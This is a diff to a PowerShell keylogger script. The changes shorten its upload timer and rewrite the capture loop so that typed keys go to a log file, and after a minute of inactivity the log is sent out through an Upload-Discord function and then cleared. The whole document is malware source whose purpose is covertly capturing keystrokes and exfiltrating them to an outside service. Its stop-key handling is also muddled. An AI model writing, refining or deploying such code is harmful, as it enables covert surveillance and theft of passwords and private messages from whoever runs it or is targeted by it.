@@ -34,7 +34,7 @@ $keylog = ""
 
 # Create a timer to upload keylog to Discord every minute
 $timer = New-Object System.Timers.Timer
-$timer.Interval = 60000  # 60000 ms = 60 seconds
+$timer.Interval = 10000  # 10000 ms = 10 seconds
 
 # Define the timer action
 $timerAction = {
@@ -50,31 +50,38 @@ Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action $timerAction
 # Start the timer
 $timer.Start()
 
-# Event handler for keypress
-$OnKeyPress = {
-    param (
-        $key
-    )
-    $now = [System.DateTime]::Now
-    $elapsedTime = $now - $lastKeystrokeTime
-    $lastKeystrokeTime = $now
-
-    # Log the key
-    Add-Content -Path $logFilePath -Value $key
-}
-
-# Register the keypress event
-Register-WmiEvent -Class Win32_Keyboard -SourceIdentifier "KeyPress" -Action $OnKeyPress
-
-# Start the script and wait for Ctrl+Alt+0 to stop
+# Start monitoring keystrokes
 Write-Host "Monitoring keystrokes. Press Ctrl+Alt+0 to stop."
-
 while ($true) {
-    $key = [Console]::ReadKey()
-    if (($key.Modifiers -eq [ConsoleModifiers]::Control -and $key.Key -eq "D0") -and ($key.Modifiers -eq [ConsoleModifiers]::Alt -and $key.Key -eq "D0")) {
-        # Stop the script and unregister events
-        $timer.Stop()
-        Unregister-Event -SourceIdentifier "KeyPress"
-        break
+    # Check if a key is available
+    if ([System.Console]::KeyAvailable) {
+        $keyInfo = [System.Console]::ReadKey()
+        $key = $keyInfo.KeyChar
+
+        # Log the key
+        Add-Content -Path $logFilePath -Value $key
+        $lastKeystrokeTime = [System.DateTime]::Now
+    }
+
+    # Check if the keylog should be uploaded
+    $elapsedTime = [System.DateTime]::Now - $lastKeystrokeTime
+    if ($elapsedTime.TotalSeconds -ge 60) {
+        $text = Get-Content -Path $logFilePath
+        Upload-Discord -text $text
+        Clear-Content -Path $logFilePath
+    }
+
+    # Check if Ctrl+Alt+0 is pressed to stop the script
+    if ([System.Console]::KeyAvailable) {
+        $keyInfo = [System.Console]::ReadKey()
+        if (($keyInfo.Modifiers -eq [System.ConsoleModifiers]::Control -and $keyInfo.Key -eq "D0") -and ([System.Console]::KeyAvailable)) {
+            $keyInfo = [System.Console]::ReadKey()
+            if ($keyInfo.Modifiers -eq [System.ConsoleModifiers]::Alt -and $keyInfo.Key -eq "D0") {
+                # Stop the script and unregister events
+                $timer.Stop()
+                Unregister-Event -SourceIdentifier "Elapsed"
+                break
+            }
+        }
     }
 }
